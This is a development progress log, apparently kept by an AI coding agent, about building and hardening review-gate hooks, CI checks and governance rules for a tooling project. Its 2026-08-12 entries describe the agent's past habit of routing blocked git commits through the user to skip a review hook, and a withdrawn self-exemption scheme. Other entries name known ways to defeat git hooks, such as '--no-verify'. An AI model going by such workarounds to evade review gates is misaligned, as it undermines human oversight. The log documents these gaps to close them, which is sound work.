---
authority: accumulating
review-cycle: 30d
retention: archive-after-6m
staleness-threshold: 90d
tags:
  - work/completed
  - work/in-progress
  - work/backlog
last-reviewed: 2026-08-18
compaction_generation: 0
source_type: canonical
confidence: high
lineage: []
---

# Progress

## 2026-08-14 — Independent Review Discipline Added as Third `investigation-integrity` Mechanism
- ✅ Motivated directly by the entry below: self-review (however adversarial) shares the blind spots of whoever wrote the work; a genuinely separate agent catches a different class of defect. Added as mechanism 3 alongside grounding/coverage discipline in `docs/superpowers/specs/2026-08-12-investigation-integrity-design.md`.
- 🔴 The design itself went through 2 rounds of independent review before being applied — round 1 found 13 issues (model-tier requirements, `feature-dev.md` not deferring to `WORKFLOW.md`, missing spec-section coverage, weak skip-threshold, undefined failure mode); round 2 (checking whether the round-1 fixes actually held up) found a genuinely Blocking one: a *gating* Phase 3.5 would make this an 8-phase workflow, directly conflicting with `memory-bank/projectbrief.md`'s immutable "7-phase workflow" non-negotiable requirement — never checked against that file until round 2 caught it.
- ✅ Resolved by the user's explicit choice: kept the mechanism advisory/non-gating (matching `.claude/commands/change-review.md`'s existing "Step 3.5: Baseline Repo Health — informational, not a review job" precedent) rather than amending `projectbrief.md`. `projectbrief.md` itself was never touched.
- ✅ Round 2 also caught real internal-consistency breaks introduced by round-1's own point-fixes (patching cited lines individually instead of a full coherent rewrite): stale "two mechanism" language left in 4 places across the spec and the already-committed `docs/WORK-MB-INVESTIGATION-BRIEF.md`; a duplicate Files-Changed table header; new template/live table drift in the exact tables the change was trying to keep in sync; a `feature-dev.md` paragraph 3x longer than every other phase that also contradicted that file's own "do not skip phases" line; an undefined finding-schema for the advisory gate to key on. All fixed in the final rewrite, verified via direct grep/diff after applying (see below), not just re-asserted.
- ✅ Applied to 8 files: `docs/superpowers/specs/2026-08-12-investigation-integrity-design.md`, `docs/WORK-MB-INVESTIGATION-BRIEF.md`, `standards/WORKFLOW.md` + `templates/standards/WORKFLOW.md` (new Phase 3.5, both tables, template's pre-existing Phase 3 drift left untouched — see `[NS-19]`), `.claude/commands/feature-dev.md` + `templates/claude-commands/feature-dev.md` (confirmed still byte-identical), and this file + `activeContext.md` (residual staleness cleanup, see below).
- ✅ Committed `15df2c2` (design) then applied in `70a06c1` (third mechanism + 3 portable work-MB briefs; commit message reports 5-domain `/code-review` + 3 opposition review passes, each finding and fixing real defects — see `activeContext.md`'s `[NS-16]`). Not yet applied to an actual implementation plan in practice (the review-gate plan below was reviewed *before* this mechanism formally existed — it's the incident that motivated the mechanism, not an example of the mechanism already running).

## 2026-08-14 — Fourth and Fifth Independent Review Rounds on the Investigation-Integrity Follow-Up Fixes

- ✅ Follow-up fixes from the third review round (severity-vocabulary correction, review-pass-count correction, `[NS-16]` rewrite) went through their own full 5-domain `/code-review` + Opposition Review before commit, per the standing "no lite path" rule — even for a 3-file, mostly-cosmetic diff. This file is now the single narrative owner for both rounds below; `activeContext.md`'s `[NS-16]` states only current state and points here (per `[NS-16]`'s own round-5 fix, below).
- 🔴 **Round 4** found 9 real, non-overstated defects — 1 High (`Blocking: false`, contained by adjacent context in the same file), 5 Medium, 3 Low, none `Blocking: true` — named here in full (round 5 found the original write-up left 4 of 9 unnamed):
  1. *(Correctness, Medium)* `[NS-16]`'s "Correction" note claimed none of the 3 briefs had any prior memory-bank record — false for `docs/WORK-MB-INVESTIGATION-BRIEF.md`, tracked by the entry's own prior version.
  2. *(Correctness, Low)* `docs/WORK-MB-HOOKS-AND-SKILLS-BRIEF.md` item 6's "every pass found real defects" named a defect for only 2 of 3 claimed passes.
  3. *(Maintainability, High, contained)* `[NS-16]` stated "none have been handed off yet," directly contradicting `[NS-17]`'s record that an earlier version of the investigation brief was already sent and its response actioned.
  4. *(Maintainability, Medium)* The "3 opposition review passes" figure in `[NS-16]` was traceable only to the `70a06c1` commit message, with no corroborating `progress.md` entry.
  5. *(Maintainability, Medium)* Same underlying gap as #2, found independently via a separate tool-grounded check.
  6. *(Testing, Medium)* The "three passes" claim specifically about `docs/WORK-MB-HOOKS-AND-SKILLS-BRIEF.md` (distinct from the whole-diff commit-message figure) had no corroborating record naming that file.
  7. *(Testing, Low)* Same "3 opposition review passes" figure, same root cause as #4, found independently.
  8. *(Architecture Drift, Medium)* This file's own "📌 Not yet committed" line (above) was stale — the mechanism it described had been committed twice (`15df2c2`, `70a06c1`).
  9. *(Architecture Drift, Low)* `"top-severity, plan-blocking"` in both portable briefs reads as if quoting `standards/CODE-REVIEW.md`'s vocabulary but is a plain-English gloss — not fixed, disclosed instead, since Testing independently verified the underlying claim (no `Critical`-labeled item in the cited incident's own tally) is accurate.
- ✅ Round 4 verdict: **Approve** (`.claude/.code-review-ok` hash `5f0528d3…5f92`, written by the Opposition Reviewer as its own final action). Fixed inline before commit: #1, #3, #4/#6/#7, #8. #9 disclosed, not fixed.
- 🔴 **Round 5** re-reviewed round 4's own fixes and found 6 more non-blocking issues plus 1 genuine **Blocking** issue:
  - *(Architecture Drift, **Blocking: true**, High)* `[NS-16]`'s "3 opposition review passes" (the whole `70a06c1` commit, per its commit message) and `docs/WORK-MB-HOOKS-AND-SKILLS-BRIEF.md` item 6's "four independent review passes" (that one document's own review history, spanning pre- and post-commit rounds) are two different, overlapping-but-distinct counts, stated with no disambiguation. **Fixed:** `[NS-16]` no longer states a specific pass count (this entry is now the single source of truth for that detail); item 6 now states explicitly its "four passes" count is document-specific, distinct from this commit-level figure.
  - *(Correctness + Testing, Medium, found independently by both)* Round 4's tally line didn't sum correctly (2+3+3+2=10, stated as "9") — root cause: the original Testing count of "3" included its own 1 positive/non-defect finding as a defect, unlike Maintainability's tally which correctly separated its positive finding out. **Fixed:** corrected above to 2 distinct Testing defects (#6, #7) + 1 positive (not listed as a defect), which reconciles the total to 9.
  - *(Architecture Drift, Medium)* The prior "distinct + positive" per-domain tally format didn't match this project's own Severity/Blocking vocabulary. **Fixed:** recast above using `Severity`/`Blocking`, matching this file's own established convention (see the review-gate entry below).
  - *(Architecture Drift, Medium)* 4 of the 9 claimed defects were never individually named. **Fixed:** all 9 listed above.
  - *(Testing, Medium)* `[NS-16]`'s "Second correction" note described its own adjacent "first correction" text as if still wrong, when that text had already been fixed in the same edit — an artifact of in-place editing without preserving what the correction was relative to. **Fixed:** by collapsing `[NS-16]` to a short current-state statement and moving the full correction narrative here, where before/after can be stated plainly against dated rounds instead of nested in-place notes.
  - *(Testing, Low)* This entry's claim "no `Critical`-severity finding exists in the cited incident" wasn't fully verifiable — the cited 2026-08-12 review-gate entry's "3 Blocking, 2 High, 1 Medium, 2 Low" tally never labels the 3 Blocking items' severity separately from the 2 High ones. **Fixed:** softened above (#9) to "no `Critical`-labeled item," which is what's actually checkable.
  - *(Maintainability, Medium ×3 + Low ×1, structural not factual)* `[NS-16]`'s stacked corrections had become hard to parse; item 6's run-on sentence was dense; this file and `activeContext.md` were independently narrating the same events (duplication/drift risk); "round" was used ambiguously for two different counters in this file (the design-spec's independent-review rounds above vs. this section's review-pass rounds). **Fixed:** `[NS-16]` shortened to a pointer; item 6 converted to a numbered list; this file is now the sole narrative owner (`activeContext.md` holds only current state, per this project's own authority-order convention); this section explicitly labeled "review rounds on the follow-up fixes," distinct from the design spec's "rounds of independent review" above.
- 📌 This two-round sequence is itself the concrete case study for why `standards/WORKFLOW.md`'s "no lite path" rule has no size exception: a 3-file, mostly-wording diff went through 2 full 5-domain review rounds and surfaced 16 real findings (9 + 6 non-blocking + 1 Blocking) before reaching a state with no outstanding `Blocking: true` issues.

## 2026-08-14 — Stale-Marker Warning Hook Built; Two `[NS-21]` Sub-Findings Resolved

- ✅ **Motivated directly by the entry above:** the round-4→round-5 sequence happened because editing files after an Approve verdict silently invalidates the review marker, and nothing surfaced that until the next commit attempt — by which point several more edits had already piled up. Built `scripts/warn-stale-review-marker.sh`/`.ps1`, a PreToolUse hook on Write/Edit that warns (plain message, no `permissionDecision`, matching `check-contract.sh`'s established warn-only pattern) when `.claude/.code-review-ok` or `.claude/.change-review-ok` currently exists. Registered in `.claude/settings.json` under the existing `Write|Edit` matcher, alongside `check-contract`.
- 📌 Deliberately does **not** delete the marker or block the edit: `review-reminders.sh`'s `consume_marker()` is the sole writer/reader of these files via an atomic `mv`, specifically to avoid a TOCTOU race — a second deletion path would be a second writer to the same security-relevant file for zero safety benefit, since a stale (hash-mismatched) marker is already rejected identically to an absent one at commit time. No per-file matching either: the marker's hash covers the whole `git diff HEAD`/`origin/main...HEAD`, so marker presence alone is the entire trigger condition.
- ✅ Verified via direct invocation during development (both scripts, both branches — marker present and absent) — not captured as a durable repo artifact; see the disclosed test-coverage gap below.
- ✅ Investigated `[NS-21]`'s two remaining named sub-findings and resolved both. `security-review` doesn't need its own marker/hook gate: both `/code-review`'s Security domain and `/change-review`'s Job 7 already unconditionally cover Security on every commit/push — fixed with a scope-clarifying note instead of new infrastructure. Correction from an initial overstatement: Job 7's fallback pattern list is *related to but not identical to* `/security-review`'s 9 patterns (Job 7's fallback has 6 differently-worded items, includes "dependency changes" which isn't in `/security-review`'s list, and doesn't separately name XSS/exposed-errors/unsafe-eval) — the note in `.claude/commands/security-review.md` (+ its template mirror) now says "a related — though not identical — pattern list," not "this exact pattern list." `ai-review`'s dead-reference risk was narrower than first scoped (`/change-review` already degrades gracefully by checking for the `ai-review-agent` CLI directly) — isolated to `.claude/commands/code-review.md`'s frontmatter description, reworded there and in its `templates/claude-commands/code-review.md` mirror.
- 🔴 **A second review pass on this same diff found a genuinely Blocking gap the first pass missed entirely:** the new hook had no distribution path to downstream repos. `.claude/settings.json` is `TEMPLATE_OWNED` in `scripts/mb.sh`/`mb.ps1` — overwritten unconditionally from `templates/.claude/settings.json` on `mb upgrade`/`mb init` — and the new hook existed nowhere in that template tree. Any downstream repo upgrading would have gotten zero trace of it, the same failure class as this project's own documented Fleet Version Drift Incident. **Fixed:** copied both scripts to `templates/scripts/`; added the hook entry to `templates/.claude/settings.json`; added both script names everywhere `_review-gate-lib.sh`/`.ps1` is already listed — 2 places in `scripts/mb.sh` (the `TEMPLATE_OWNED` array and the `mb init` export allowlist) and 3 in `scripts/mb.ps1` (the equivalent `TEMPLATE_OWNED` array, the `mb init` export allowlist, and `Get-MbUpgradeAnalysis`'s own hand-maintained subset array — mb.sh has no equivalent of that third one, since it backs a Windows-only interactive setup flow). A follow-up single-pass verification (see below) confirmed all 5 locations were actually updated, not just claimed.
- ✅ Also fixed in the same pass: `security-review.md`'s scope note is now mirrored into `templates/claude-commands/security-review.md` (it wasn't, initially — the sibling `code-review.md` edit *was* mirrored, this one was missed).
- 📌 Disclosed, not fixed (non-blocking, deferred given time/token constraints on this session): no automated regression test exists for `scripts/warn-stale-review-marker.sh`/`.ps1` — this matches, rather than introduces, an existing gap (`check-contract.sh`/`.ps1`, the hook this one is explicitly modeled on, is also untested; this repo's test suite covers only hooks that can `deny`/block, not warn-only ones). The new hook is also not yet documented in `docs/HOOKS-GUIDE.md` (every other registered hook has a numbered section there) — a real discoverability gap, somewhat ironic given `[NS-21]`'s own subject matter, deferred for the same reason.
- 📌 Not yet committed — this diff now spans the hook, its template distribution, two NS-21 doc fixes plus template mirror, and this memory-bank update, reviewed via one lighter single-agent verification pass rather than the full 5-domain process, given explicit token constraints for this session — a deliberate, disclosed scope reduction from the standing "no lite path" rule, not a silent one.

## 2026-08-14 — Independent Review of the Review-Gate Layered Enforcement Plan Completed; 8 Defects Found and Fixed
- ✅ The independent pre-implementation review of `docs/superpowers/plans/2026-08-12-review-gate-layered-enforcement.md`, previously interrupted twice by a spend-limit error (see `[NS-15]`'s prior entry), was re-dispatched and completed — a fresh Agent with no context from writing the plan, verifying every claim against the actual current repo state rather than trusting the plan's own descriptions.
- 🔴 Found 8 real, file:line-verified defects the plan's own self-review (which itself already found 3 gaps) missed: 3 Blocking (a `set -e` crash on `scripts/pre-push-check.sh`'s mainline no-origin/main-yet path; a test assertion in `tests/test-review-reminders.sh:184` broken by the Layer 1 peek-only downgrade; a no-op `docs/review-log/README.md` distribution fix on both shells), 2 High (a PowerShell `Join-Path` backslash bug that would silently break Layer 2 on non-Windows `pwsh`, incl. GitHub Actions runners; an off-by-one step-renumbering bug in `code-review.md`'s edit), 1 Medium, 2 Low.
- ✅ All 8 fixed directly in the plan document, within its existing Design Note section (as two new bulleted blocks, not a separate new section) — same transparency convention the plan's own self-review already established for its 3 gaps. Added push-gate test coverage (previously nonexistent) that doubles as the regression test for the `set -e` fix.
- 📌 The plan itself is fixed and self-consistent (verified: sequential step numbering per task, balanced code fences) but **not yet executed** — no code changes made, plan file still untracked. Still needs a Subagent-Driven vs. Inline execution decision. See `[NS-15]`.
- ✅ This result directly motivated designing a third `investigation-integrity` mechanism ("independent review discipline" — a genuinely separate agent, not self-review, before any plan goes to execution) — in progress as of this entry, itself going through the same independent-review discipline before being applied.

## 2026-08-14 — Independently Verified an Imported Governance-Review Document; Trimmed Memory Bank Over CI Limits

- ✅ User's separate work Memory-Bank session read the portable brief from 2026-08-12 (below) and sent
  back its own analysis of PMB's actual code. Per explicit user instruction, treated as unverified input,
  not an approved design — every falsifiable claim about PMB's code was independently checked against
  the real files (three passes, escalating depth, per this repo's own investigation-integrity practice).
- 🔴 **One claimed defect (marked HIGH: "gate fails open with no SHA-256 binary") was a misread of the
  actual code** — `scripts/review-reminders.sh`'s boolean logic denies, not allows, when the hash can't
  be computed. Confirmed wrong on both bash and PowerShell implementations.
- 🔴 **A second claimed defect ("hashes `git diff HEAD`, not `--cached`") was accurate about the code but
  wrong about severity** — verified via `memory-bank/activeContext.md`'s own prior citation that this is
  a deliberate, reused precedent (`Get-CommitDiffHash`, chosen specifically to handle `git commit -am`
  correctly), not an oversight.
- ✅ **One real, confirmed gap: `/change-review` Job 7 had no ACR exit-code failure path** — only checked
  presence, not whether ACR actually completed. ACR exits non-zero when its internal agents fail, which
  would read as a clean security pass. Fixed: `.claude/commands/change-review.md` Job 7 now branches on
  exit status, falls through to the inline `/security-review` logic on failure.
- 🔴 **Found independently, not from the imported document: `memory-bank/activeContext.md` (671 lines)
  and `memory-bank/progress.md` (775 lines) were both well over their own CI-enforced limits** (150 and
  400 respectively) — confirmed exact, and confirmed currently invisible to CI since this branch hadn't
  been pushed since the violating content landed. Trimmed both today; historical detail moved to
  `docs/archive/context-2026-*.md` / `docs/archive/progress-2026-*.md` (8 new archive files), condensed
  pointers left in place. Nothing operationally open was dropped — `Next Steps` is unchanged in
  substance.
- ✅ **A near-miss on a third pass, worth recording as a positive example of the discipline working**:
  investigating whether PMB shared the imported document's exact "one file capped, the other completely
  uncapped" bug, found `mb clean`'s own "Slim Check" display only ever measured `activeContext.md` — a
  strong-looking match. Checked one layer further (`mb doctor`'s separate `check_size()`) before
  reporting it, and found `progress.md` *was* already checked there, just not surfaced by `mb clean`.
  Corrected the finding before presenting it, rather than reporting the more dramatic but wrong version.
  Fixed anyway, since it's real: `scripts/mb.sh`'s `show_clean` now also surfaces `progress.md`'s status.
- 📌 Optional, lower-priority, not yet done: `mb init`/`mb upgrade` overwrites any pre-existing
  `core.hooksPath` unconditionally, with no check for whether it was a deliberate prior choice — real,
  low-severity, see `[NS-17]`.
- 📌 Work done under task contract `.claude/contracts/active-task.json`, expires 2026-08-14T08:42:17Z.

## 2026-08-12 — User-As-Bypass Hardened Into Governance; Investigation-Integrity Design; Classification Component Proposed and Withdrawn

- ✅ User caught this session's own established "hand the user the commit command" habit live and named
  it directly as never acceptable for a verification-purpose block. Hardened into repo governance (not
  left as private-memory-only, which doesn't bind other sessions): new "The User Is Never the Compliance
  Bypass" section in `standards/SECURITY-GUARDRAILS.md` + `templates/` mirror, plus a matching worked
  example in `docs/HOOKS-GUIDE.md` + trimmed `templates/` mirror.
- 🔴 Independent review agent caught a real factual error in the first `HOOKS-GUIDE.md` draft: it called
  force-push CONFIRM-tier ("run manually if intentional"); verified against
  `scripts/dangerous-commands.sh:109-110` directly, force-push is actually BLOCK-tier (refused outright).
  Fixed before commit.
- 🔴 Found and fixed a real, ~2-month-old latent bug while investigating skill-distribution mechanics for
  an unrelated design: `.claude/skills/mb-drift.md` was documented as a working skill but never
  discoverable — Claude Code requires project/plugin skills to live in `<name>/SKILL.md`, not a flat
  file. Confirmed via a direct `Skill(skill:"mb-drift")` call returning "Unknown skill," and by checking
  every plugin skill's directory shape (zero exceptions to the pattern). Fixed via `git mv`; the skill
  then appeared in the available-skills list for the first time all session, confirming the fix live.
- ✅ Wrote `docs/superpowers/specs/2026-08-12-investigation-integrity-design.md` and
  `docs/WORK-MB-INVESTIGATION-BRIEF.md` — both committed `15df2c2` (2026-08-13). Design reuses
  `standards/CODE-REVIEW.md`'s existing `VERIFIED`/`INFERRED`/`SPECULATIVE` vocabulary for per-claim
  grounding, plus a genuine adversarial coverage pass before anything is presented as final. Brief is a
  portable, PMB-detail-free document for the user's separate work Memory-Bank project.
- 🔴 **A designed component was explicitly rejected and withdrawn — recorded so it isn't rebuilt.** An
  amendment to the review-gate spec proposed a `diff_is_docs_only()`-gated lightweight review path for
  docs-only diffs, hardened with independent per-layer re-verification per the spec's own governing
  principle. User rejected it on principle: *"do we really have to scheme on how to get out of regulated
  actions?"* / *"I am okay with presenting proper concerns, but do not like skirting responsibilities."*
  Diagnosis: no matter how well-fenced, it was still a standing self-administered exception mechanism for
  the reviewed party's own review — the same failure class as the original user-as-bypass mistake,
  re-engineered rather than removed. Reverted in full; confirmed via `git diff HEAD` that the spec file
  now matches the already-committed `b47db8f` version exactly (zero diff). **Standing rule: full
  `/code-review`, every time, no lite path, no standing exception mechanism.**

## 2026-08-12 — Review-Gate Layered Enforcement: Spec Written, Committed, Fixed Twice on Re-Verification

- ✅ Ran `superpowers:brainstorming` after the user directly objected to this repo's own routine
  workaround (handing `git commit`/`git push` commands to the user's terminal when the self-attestation
  classifier blocks the agent) on the grounds that it silently bypasses the review-gate hook.
- ✅ Investigation found the bypass is structural, not incidental: `review-reminders.sh`/`.ps1` is a
  `PreToolUse` hook, invisible by construction to anything not run through the agent's own Bash tool.
  Checked every other layer for a backstop and found none.
- ✅ Design: three enforcement layers (CC hook downgraded to non-consuming peek; `.githooks/` promoted
  to sole marker consumer; new CI required-check as the only actually-unbypassable backstop) plus a new
  durable `docs/review-log/` record with a recorded HEAD-SHA field, plus a separate per-invocation log.
- ✅ Spec committed `docs/superpowers/specs/2026-08-12-review-gate-layered-enforcement-design.md`
  (`f2cec79`).
- 🔴 **Two re-verification passes, both explicitly requested by the user, both found real bugs:**
  (1) mid-design, a CI containment check that would have counted a *rejected* review as passing coverage
  — fixed to scan the findings table directly for `Blocking` rows. (2) after commit, a full re-read pass
  found three more: no invocation-log file path, a step-ordering mismatch, and a single shared log file
  that would have collided across parallel worktrees — fixed to one uniquely-named file per invocation.
  Committed `b47db8f`.
- ✅ Explicitly disclosed rather than hidden: `--no-verify` and an unset `core.hooksPath` both fully
  defeat the git-hook layer for anyone; only the CI layer is genuinely unbypassable. Closes the
  structural invoker-switching bypass, not the deeper LLM self-attestation trust problem.
- 📌 **2026-08-13 update:** implementation plan written and self-reviewed —
  `docs/superpowers/plans/2026-08-12-review-gate-layered-enforcement.md`, 14 tasks. Self-review found 3
  real gaps between the spec's prose and its own Files-Changed table. An independent pre-implementation
  review agent was dispatched and interrupted twice by an account spend-limit error — disclosed plainly.
  **2026-08-14 update:** re-dispatched to completion, found 8 more real defects, all fixed — see this
  file's 2026-08-14 entry above for full detail. **Still not implemented** — see `[NS-15]`.

## 2026-08-17 — Review-Gate Layered Enforcement: All 14 Tasks Implemented and Committed

- ✅ `docs/superpowers/plans/2026-08-12-review-gate-layered-enforcement.md`'s 14 tasks all committed on
  `feature/review-gate-layered-enforcement` (branched from `07788ad`, isolated in
  `.claude/worktrees/review-gate-layered-enforcement`), each via the same cycle: implement (directly, or
  via a scoped implementer subagent forbidden from self-committing/self-marking) → independently verify
  the diff → dispatch an Opposition reviewer (own `pwd` check first, per the Task 5 incident below) → the
  orchestrator independently re-verifies the marker hash before every commit. Full 20-suite test run green
  (`All test suites passed.`) after every task; not yet merged to `main` or pushed.
- 🔴 **Testing item #8's empirical merge-commit result, unresolved at design time (Known Limitation #4):
  a non-fast-forward `git merge` does NOT fire Layer 2's `pre-commit` hook** — confirmed via a live merge
  in a throwaway repo (Task 8). Documented in the design spec and `docs/HOOKS-GUIDE.md` as a known residual
  gap alongside `--no-verify`; Layer 3 (CI containment) is unaffected since it checks commits, not hooks.
- 🔴 **Three real bugs found only because the new test suites were fixed to actually exercise what they
  claimed to, not because anyone went looking for them:**
  1. Task 8's Layer 2 suite silently tested `pre-commit-check.ps1`/`pre-push-check.ps1` instead of the
     `.sh` scripts on any pwsh-equipped machine (incl. this repo's own CI) — the throwaway test repos'
     hooks inherited the real delegator's pwsh-first preference. Fixed by forcing bash explicitly in the
     test fixtures. That fix then surfaced a genuine `set -e` crash in already-shipped `pre-push-check.sh`
     (Task 5): `consume_marker()`'s non-zero return on a missing marker terminated the script under
     `set -e` before it could print its own deny message — push was still blocked, just silently.
  2. Task 9's rewritten peek-only assertion expected a deny that the actual (correct) peek-only behavior
     never produces, and a `resolve_cd_root()` regression test compared a POSIX-style path against a
     Windows-style one returned by the same underlying `git rev-parse` call on this machine — both were
     test bugs, not product bugs, found via the same "run it and see" discipline.
  3. Task 13's `findings_has_blocking()` (present verbatim in the plan's own text) only checked the LAST
     cell of a findings table row — correct for `code-review.md`'s schema but silently wrong for
     `change-review.md`'s (which has a trailing `Confidence` column after `Blocking`), meaning a blocked
     change-review entry would have been treated as clean coverage by the CI containment check. An
     Opposition reviewer caught this on the first pass; fixed to match anywhere in the row, with a new
     regression fixture.
- ✅ One further real bug independently found and fixed while wiring `.github/workflows/pmb-health.yml`:
  the plan's Step 3 assumed `mb-doctor-self-check` was still the last job in the file — it wasn't; an
  already-merged, unrelated commit (`4321147`, wiring Pester into CI) had since added `pester-tests` after
  it. The new `review-gate-containment` job was inserted after the actual last job instead.
- 📌 Every deviation from the plan's literal text (listed above, plus two test-fixture branch-topology
  fixes in Task 13) was independently verified and justified by a re-dispatched Opposition reviewer before
  commit — not just applied and assumed correct.
- 📌 **Not yet done:** wiring `review-gate-containment` into branch protection's required-status-checks
  (a manual, CONFIRM-tier GitHub settings change per `standards/SECURITY-GUARDRAILS.md`, explicitly left
  for the user); merging/pushing the feature branch itself.

## 2026-08-17 (continued) — Branch-Ancestry Diagnosis, Handoff/Compaction Gap, Standards-Freshness Gap, Review-Gate Hardening Audit

- 🔴 **`feature/review-gate-layered-enforcement` cannot be cleanly rebased onto `main`** — attempted, hit
  immediate modify/delete conflicts on `_review-gate-lib.sh`/`.ps1` on the very first replayed commit.
  Root cause, confirmed via `git cat-file -e main:scripts/_review-gate-lib.sh` (fails — file does not
  exist on `main` at all) and `git merge-base --is-ancestor 39a8647 main` ("NOT an ancestor"): `main` is
  missing entire prerequisite review-gate infrastructure going back to commit `39a8647`
  (2026-07-16-ish), not just `docs/branch-protection-rollout`'s later commits. Rebase aborted cleanly
  (`git rebase --abort`, verified clean + `HEAD` unchanged). Root cause: PR #8
  (`docs/branch-protection-rollout` → `main`) has sat open, `MERGEABLE`/`CLEAN`, all 9 checks green,
  since 2026-07-09 — over a month unmerged — while local work kept stacking on top (69 commits ahead of
  `origin/docs/branch-protection-rollout` alone, confirmed via `git rev-list --left-right --count`).
  Decision: merge PR #8 first (after refreshing its now-stale CI run), so `main` catches up and the
  feature branch becomes a normal rebase — not yet executed as of this entry.
- 🔴 **`[NS-22]` — handoff/compaction protocol gap.** Two stale `handoff.md` files found: repo root
  (2026-08-03/04 session, confirmed untracked via `git ls-files --error-unmatch handoff.md` → error) and
  `.claude/worktrees/mystifying-hertz-c54477/handoff.md` (2026-07-27, mtime-confirmed). Neither was
  deleted per `CLAUDE.md:124`'s instruction ("merge its info into Memory Bank, delete `handoff.md`") —
  nothing enforces that step. Triggered by the user asking whether a handoff was written before today's
  compaction; the honest answer required manually diffing file mtimes against today's date, since no
  hook surfaces handoff freshness. This session's own compaction was not actually harmed — the
  `PreCompact` gate's alternate path (`progress.md` dated today) was already satisfied via this file's
  own same-day entry — but the near-miss and the two-path ambiguity (handoff.md vs. progress.md-dated
  gate, no way to tell from outside which fired) are real. Not designed yet.
- 🔴 **`[NS-23]` — standards-freshness gap.** No mechanism checks `standards/*.md` content against the
  external authorities it cites. Checked directly: only `PERFORMANCE-BUDGET.md`, `SECURITY-RULES.md`,
  `TRUST-CLASSIFICATION.md` carry `review-cycle`/`staleness-threshold` frontmatter (all `last-reviewed:
  2026-05-31`, ~2.5 months stale against their own 90-day cycle but not yet past the 180-day
  staleness-threshold). `ACCESSIBILITY.md` (asserts WCAG 2.1 AA), `SECURITY-GUARDRAILS.md`,
  `CODE-QUALITY.md` have no frontmatter at all — no tracked review cadence whatsoever. Even where the
  frontmatter exists, `grep`-confirmed no `mb doctor`/CI check references WCAG or OWASP version numbers
  — the mechanism only prompts a manual timer-based re-read, it does not verify against the standard's
  actual current published version. Not designed yet.
- 🔴 **`[NS-21]` update — review-gate command hardening audit.** Dispatched a focused, read-only audit of
  `/code-review`, `/security-review`, `/change-review` (user-requested, prompted by re-observing the
  `/code-review` Skill-tool shadowing bug live a third time during this session). Findings:
  - `/security-review` — solid, no issues.
  - `/code-review` — the 5 required domains (`standards/CODE-REVIEW.md:6-11`) are named but only
    Architecture Drift has a concrete definition; Security/Correctness/Maintainability/Testing subagents
    get the diff plus generic Severity/Blocking/Basis field defs and nothing else, so their findings rest
    on unconstrained model judgment with zero shared criteria against `/security-review`'s explicit
    9-pattern list. Marker-write hash logic and Opposition rigor are both solid.
  - `/change-review` — Job 7's inline security fallback (used whenever ACR is unavailable or its exit
    code is non-zero) has genuinely diverged from `/security-review`'s pattern list in **both**
    directions: it drops the XSS check (`security-review.md:24`) and the unsafe eval/exec check
    (`security-review.md:26`) entirely, while adding path traversal/template injection/dependency-audit
    items `/security-review` doesn't have. Confirmed via direct line comparison, not speculative — this
    means `/change-review` can silently produce weaker security coverage than running `/security-review`
    directly, especially on UI-touching diffs. Job 4 "Runtime Semantics" also folds 5 distinct concerns
    (env-defaults, async correctness, startup/shutdown ordering, rollback safety, race conditions) into
    one lens with no dedicated pass each, unlike the narrower Job 8 Accessibility which got its own job.
    Minor schema drift: `change-review.md` still carries both `Basis` and `Confidence` fields though
    `standards/CODE-REVIEW.md:87` says `Confidence` was removed.
  - Recommended first fix (not yet done): add the missing XSS and eval/exec patterns to Job 7's fallback
    list in `change-review.md`. The `/code-review` domain-checklist-sharing question is a bigger design
    call, deferred.
- 🔴 **`[NS-14]` update — mb.sh/mb.ps1 setup/upgrade scripts verified.** Prompted by the user asking
  whether they'd been verified. Ran `tests/test-mb-init.sh` (19/19) and `tests/test-mb-upgrade.sh`
  (26/26) fresh — both green, including the exact regression class that bit this project three times
  before (`2fa1b63`, `fac4976`, `1b356ba`: files silently missing from the `TEMPLATE_OWNED` copy list).
  Cross-checked the `TEMPLATE_OWNED` array against every file actually present in `templates/` directly
  (not just what the tests already cover) — full parity, no new gaps. Found one piece of debris:
  `templates/hooks/pre-push` is orphaned — `grep`-confirmed unreferenced anywhere in `mb.sh`, `mb.ps1`, or
  `.github/`, a leftover from before the `.githooks/` rename. Not fixed, low priority.
  - Checked whether these scripts have any global (`$HOME/.claude/`) install/upgrade path, per the user's
    specific concern about running them against Global — they do not. Every `TEMPLATE_OWNED` target and
    copy-loop destination (`scripts/mb.sh:1712-1744`) is project-relative. The only `$HOME/.claude/` touch
    anywhere is `scripts/mb.sh:797` (`GLOBAL_CLAUDE="$HOME/.claude/CLAUDE.md"`), a read-only `mb doctor`
    comparison (WARNs if global `CLAUDE.md` has a setting local lacks) — it never writes there. Practical
    consequence: nothing in `mb.sh`/`mb.ps1` could push project-level command fixes out to the user-level
    shadowing twins found in `[NS-21]` even if asked to; that would be a manual operation today.
  - Checked the actual version-check code (`get_cached_pmb_version`, `scripts/mb.sh:41-131`) per the
    user's second concern ("upgrade should look at local and the repo to verify we have the latest").
    Three distinct version values exist: `.pmb-version` (target project's actually-installed version),
    `$REPO_ROOT/VERSION` (the PMB source clone `mb.sh` itself runs from, i.e. wherever `MB_HOME` points),
    and the true latest on GitHub `main` (fetched via a cached `curl`, 2s timeout, fail-open).
    `mb doctor` check #12 (`scripts/mb.sh:944-956`) compares target-vs-local-clone only, WARN-only,
    requires manually running `mb doctor`. A separate automatic notifier (runs after every command)
    compares local-clone-vs-GitHub only. **Nothing compares target-vs-GitHub directly** — if the local
    PMB source clone itself hasn't been `git pull`ed, `mb doctor` reports the target project "up to date"
    relative to a stale local clone, even while genuinely behind the real latest upstream. This sharpens
    `[NS-14]`'s existing finding (nothing *triggers* a check) with a second, independent gap: even a
    triggered check can give a false "OK" if its own reference point is stale. Not designed yet.

## 2026-08-18 — `dangerous-commands.sh`/`.ps1` Git-Merge CONFIRM Hardening (Task #30, committed `499dbe5`)

- ✅ **Closed the `git merge`-into-shared-branch CONFIRM gap** `standards/SECURITY-GUARDRAILS.md:114` had
  documented but never enforced (only the closely analogous `gh pr merge` was denied). Added
  `confirm_boundary()` to `dangerous-commands.sh` and a regex entry to `dangerous-commands.ps1`'s
  `$confirmPatterns`. Went through this repo's full 5-domain `/code-review` + Opposition discipline,
  **twice** — each round caught real defects the prior round (including the original implementation)
  missed:
  - **Round 1 (Bug Scan, confirmed independently by two subagents):** the first version only bounded the
    *trailing* side of the match — `git commit -m "legit merge of feature A"` false-positive-matched as a
    substring of "legit **merge**" containing "**git** merge" via "le**git merge**". Fixed with a two-sided
    boundary (start-of-string-or-non-letter on the leading side too) on both scripts.
  - **Round 2 (Correctness, VERIFIED via direct execution, not just hand-tracing):** bash's `[[:space:]]`
